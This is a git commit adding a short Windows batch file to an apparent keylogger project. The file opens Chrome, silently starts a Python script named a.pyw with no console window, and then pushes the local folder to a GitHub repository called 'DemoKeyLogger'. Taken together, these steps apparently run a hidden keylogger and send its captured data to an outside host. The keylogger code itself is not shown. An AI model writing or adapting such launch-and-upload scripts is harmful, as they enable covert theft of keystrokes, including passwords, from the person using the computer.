d6fd5f26a2361972ef5fa824ded265002a6c369d
Cong-Tien <letien18102001@gmail.com>
2022-12-30 14:23:42 +0700

    first commit

---
+++ a.bat
@@ -0,0 +1,11 @@
+start "" "C:\Program Files\Google\Chrome\Application\chrome.exe"
+D:
+cd Applications
+cd Demo
+start "" "D:\Applications\Demo\a.pyw"
+git init
+git add .
+git commit -m "first commit"
+git branch -M main
+git remote add origin https://github.com/Cong-Tien/DemoKeyLogger.git
+git push -u origin main
